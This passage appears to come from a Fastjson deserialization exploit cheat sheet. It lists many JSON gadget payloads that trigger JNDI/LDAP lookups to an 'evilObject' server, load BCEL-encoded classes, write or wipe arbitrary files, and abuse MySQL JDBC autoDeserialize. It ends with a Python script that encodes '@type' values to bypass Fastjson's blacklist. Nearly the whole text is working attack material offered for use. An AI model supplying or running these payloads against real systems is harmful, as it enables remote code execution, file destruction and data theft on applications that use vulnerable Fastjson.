    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "ldap://127.0.0.1:8888/evilObject"
      ]
    }
}
```

 - DefaultBeanFactoryPointcutAdvisor

```java
{
  "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
   "beanFactory": {
     "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
     "shareableResources": [
       "ldap://127.0.0.1:8888/evilObject"
     ]
   },
   "adviceBeanName": "ldap://127.0.0.1:8888/evilObject"
},
{
   "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"
}
```

 - WrapperConnectionPoolDataSource

```java
{
    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "userOverridesAsString": "HexAsciiSerializedMap:aced000...6f;"
}
```

 - JndiRefForwardingDataSource

```java
{
    "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
    "jndiName": "ldap://127.0.0.1:8888/evilObject",
    "loginTimeout": 0
}
```

 - InetAddress

```java
{
	"@type": "java.net.InetAddress",
	"val": "http://dnslog.com"
}
```

 - Inet6Address

```java
{
	"@type": "java.net.Inet6Address",
	"val": "http://dnslog.com"
}
```

 - URL

```java
{
	"@type": "java.net.URL",
	"val": "http://dnslog.com"
}
```

 - JSONObject

```java
{
	"@type": "com.alibaba.fastjson.JSONObject",
	{
		"@type": "java.net.URL",
		"val": "http://dnslog.com"
	}
}
""
}
```

- URLReader

```java
{
	"poc": {
		"@type": "java.lang.AutoCloseable",
		"@type": "com.alibaba.fastjson.JSONReader",
		"reader": {
			"@type": "jdk.nashorn.api.scripting.URLReader",
			"url": "http://127.0.0.1:9999"
		}
	}
}
```

 - AutoCloseable any file writing

```java
{
	"@type": "java.lang.AutoCloseable",
	"@type": "org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream",
	"out": {
		"@type": "java.io.FileOutputStream",
		"file": "/path/to/target"
	},
	"parameters": {
		"@type": "org.apache.commons.compress.compressors.gzip.GzipParameters",
		"filename": "filecontent"
	}
}
```

 - BasicDataSource

```java
{
  "@type" : "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
  "driverClassName" : "$$BCEL$$l$8b$I$A$A$A...",
  "driverClassLoader":
  {
    "@type":"Lcom.sun.org.apache.bcel.internal.util.ClassLoader;"
  }
}
```

 - JndiConverter

```java
{
	"@type": "org.apache.xbean.propertyeditor.JndiConverter",
	"AsText": "ldap://127.0.0.1:8888/evilObject"
}
```

 - JtaTransactionConfig

```java
{
	"@type": "com.ibatis.sqlmap.engine.transaction.jta.JtaTransac
tionConfig",
	"properties": {
		"@type": "java.util.Properties",
		"UserTransaction": "ldap://127.0.0.1:8888/evilObject"
	}
}
```

 - JndiObjectFactory

```java
{
	"@type": "org.apache.shiro.jndi.JndiObjectFactory",
	"resourceName": "ldap://127.0.0.1:8888/evilObject"
}
```

 - AnterosDBCPConfig

```java
{
	"@type": "br.com.anteros.dbcp.AnterosDBCPConfig",
	"metricRegistry": "ldap://127.0.0.1:8888/evilObject"
}
```

 - AnterosDBCPConfig2

```java
{
	"@type": "br.com.anteros.dbcp.AnterosDBCPConfig",
	"healthCheckRegistry": "ldap://127.0.0.1:8888/evilObject"
}
```

 - CacheJndiTmLookup

```java
{
	"@type": "org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
	"jndiNames": "ldap://127.0.0.1:8888/evilObject"
}
```

 - AutoCloseable Clear the specified file

```java
{
    "@type":"java.lang.AutoCloseable",
    "@type":"java.io.FileOutputStream",
    "file":"/tmp/nonexist",
    "append":false
}
```

 - AutoCloseable Clear the specified file

```java
{
    "@type":"java.lang.AutoCloseable",
    "@type":"java.io.FileWriter",
    "file":"/tmp/nonexist",
    "append":false
}
```

 - AutoCloseable any file writing

```java
{
    "stream":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"java.io.FileOutputStream",
        "file":"/tmp/nonexist",
        "append":false
    },
    "writer":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"org.apache.solr.common.util.FastOutputStream",
        "tempBuffer":"SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=",
        "sink":
        {
            "$ref":"$.stream"
        },
        "start":38
    },
    "close":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"org.iq80.snappy.SnappyOutputStream",
        "out":
        {
            "$ref":"$.writer"
        }
    }
}
```

 - AutoCloseable MarshalOutputStream Any file writing

```java
{
	'@type': "java.lang.AutoCloseable",
	'@type': 'sun.rmi.server.MarshalOutputStream',
	'out': {
		'@type': 'java.util.zip.InflaterOutputStream',
		'out': {
			'@type': 'java.io.FileOutputStream',
			'file': 'dst',
			'append': false
		},
		'infl': {
			'input': {
				'array': 'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',
				'limit': 22
			}
		},
		'bufLen': 1048576
	},
	'protocolVersion': 1
}
```

 - BasicDataSource

```java
{
    "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
    "driverClassName": "true",
    "driverClassLoader": {
        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
    },
    "driverClassName": "$$BCEL$$l$8b$I$A$A$A$A$A...o$V$A$A"
}
```

 - HikariConfig

```java
{
	"@type": "com.zaxxer.hikari.HikariConfig",
	"metricRegistry": "ldap://127.0.0.1:8888/evilObject"
}
```

 - HikariConfig

```java
{
	"@type": "com.zaxxer.hikari.HikariConfig",
	"healthCheckRegistry": "ldap://127.0.0.1:8888/evilObject"
}
```

 - HikariConfig

```java
{
	"@type": "org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig",
	"metricRegistry": "ldap://127.0.0.1:8888/evilObject"
}
```

 - HikariConfig

```java
{
	"@type": "org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig",
	"healthCheckRegistry": "ldap://127.0.0.1:8888/evilObject"
}
```

 - SessionBeanProvider

```java
{
	"@type": "org.apache.commons.proxy.provider.remoting.SessionBeanProvider",
	"jndiName": "ldap://127.0.0.1:8888/evilObject",
	"Object": "su18"
}
```

 - JMSContentInterceptor

```java
{
	"@type": "org.apache.cocoon.components.slide.impl.JMSContentInterceptor",
	"parameters": {
		"@type": "java.util.Hashtable",
		"java.naming.factory.initial": "com.sun.jndi.rmi.registry.RegistryContextFactory",
		"topic-factory": "ldap://127.0.0.1:8888/evilObject"
	},
	"namespace": ""
}
```

 - ContextClassLoaderSwitcher

```java
{
	"@type": "org.jboss.util.loading.ContextClassLoaderSwitcher",
	"contextClassLoader": {
		"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
	},
	"a": {
		"@type": "$$BCEL$$l$8b$I$A$A$A$A$A$AmS$ebN$d4P$...$A$A"
	}
}
```

 - OracleManagedConnectionFactory

```java
{
	"@type": "oracle.jdbc.connector.OracleManagedConnectionFactory",
	"xaDataSourceName": "ld
ap://127.0.0.1:8888/evilObject"
}
```

 - JNDIConfiguration

```java
{
	"@type": "org.apache.commons.configuration.JNDIConfiguration",
	"prefix": "ldap://127.0.0.1:8888/evilObject"
}
```

 - JDBC4Connection

```java
{
	"@type": "java.lang.AutoCloseable",
	"@type": "com.mysql.jdbc.JDBC4Connection",
	"hostToConnectTo": "172.20.64.40",
	"portToConnectTo": 3306,
	"url": "jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
	"databaseToConnectTo": "test",
	"info": {
		"@type": "java.util.Properties",
		"PORT": "3306",
		"statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
		"autoDeserialize": "true",
		"user": "yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn",
		"PORT.1": "3306",
		"HOST.1": "172.20.64.40",
		"NUM_HOSTS": "1",
		"HOST": "172.20.64.40",
		"DBNAME": "test"
	}
}
```

 - LoadBalancedMySQLConnection

```java
{
	"@type": "java.lang.AutoCloseable",
	"@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
	"proxy": {
		"connectionString": {
			"url": "jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true"
		}
	}
}
```

 - ReplicationMySQLConnection

```java
{
	"@type": "java.lang.AutoCloseable",
	"@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
	"proxy": {
		"@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
		"connectionUrl": {
			"@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
			"masters": [{
				"host": "mysql.host"
			}],
			"slaves": [],
			"properties": {
				"host": "mysql.host",
				"user": "user",
				"dbname": "dbname",
				"password": "pass",
				"queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
				"autoDeserialize": "true"
			}
		}
	}
}
```

 - UnpooledDataSource

```java
{
	"x": {
		{
			"@type": "com.alibaba.fastjson.JSONObject",
			"name": {
				"@type": "java.lang.Class",
				"val": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource"
			},
			"c": {
				"@type": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource",
				"key": {
					"@type": "java.lang.Class",
					"val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
				},
				"driverClassLoader": {
					"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
				},
				"driver": "$$BCEL$$l$8b$..."
			}
		}: "a"
	}
}
```

## Payload Transformation Script

```python
#!usr/bin/env python
# -*- coding:utf-8 -*-

import json
from json import JSONDecodeError


class FastJsonPayload:
    def __init__(self, base_payload):
        try:
            json.loads(base_payload)
        except JSONDecodeError as ex:
            raise ex
        self.base_payload = base_payload

    def gen_common(self, payload, func):
        tmp_payload = json.loads(payload)
        dct_objs = [tmp_payload]

        while len(dct_objs) > 0:
            tmp_objs = []
            for dct_obj in dct_objs:
                for key in dct_obj:
                    if key == "@type":
                        dct_obj[key] = func(dct_obj[key])

                    if type(dct_obj[key]) == dict:
                        tmp_objs.append(dct_obj[key])
            dct_objs = tmp_objs
        return json.dumps(tmp_payload)

    # Add the payload at the beginning of L to the value of @type and the ending
    def gen_payload1(self, payload: str):
        return self.gen_common(payload, lambda v: "L" + v + ";")

    # Add the payload at the beginning of LL to the value of @type, and ending with LL
    def gen_payload2(self, payload: str):
        return self.gen_common(payload, lambda v: "LL" + v + ";;")

    # Make a value of @type\u
    def gen_payload3(self, payload: str):
        return self.gen_common(payload,
                               lambda v: ''.join('\\u{:04x}'.format(c) for c in v.encode())).replace("\\\\", "\\")

    # Perform \x on @type's value
    def gen_payload4(self, payload: str):
        return self.gen_common(payload,
                               lambda v: ''.join('\\x{:02x}'.format(c) for c in v.encode())).replace("\\\\", "\\")

    # Generate cache to bypass payload
    def gen_payload5(self, payload: str):
cache_payload = {
            "rand1": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            }
        }
        cache_payload["rand2"] = json.loads(payload)
        return json.dumps(cache_payload)

    def gen(self):
        payloads = []

        payload1 = self.gen_payload1(self.base_payload)
        yield payload1

        payload2 = self.gen_payload2(self.base_payload)
        yield payload2

        payload3 = self.gen_payload3(self.base_payload)
        yield payload3

        payload4 = self.gen_payload4(self.base_payload)
        yield payload4

        payload5 = self.gen_payload5(self.base_payload)
        yield payload5

        payloads.append(payload1)
        payloads.append(payload2)
        payloads.append(payload5)

        for payload in payloads:
            yield self.gen_payload3(payload)
            yield self.gen_payload4(payload)


if __name__ == '__main__':
    fjp = FastJsonPayload('''{
  "rand1": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://localhost:1389/Object",
    "autoCommit": true
  }
}''')

    for payload in fjp.gen():
        print(payload)
        print()
```

## Blacklist acquisition
 - Reference project: [fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)

## refer to
 - [History of Fastjson deserialization vulnerability](https://paper.seebug.org/1192/)
 - [fastjson: I head north and leave the season with you](https://su18.org/post/fastjson/)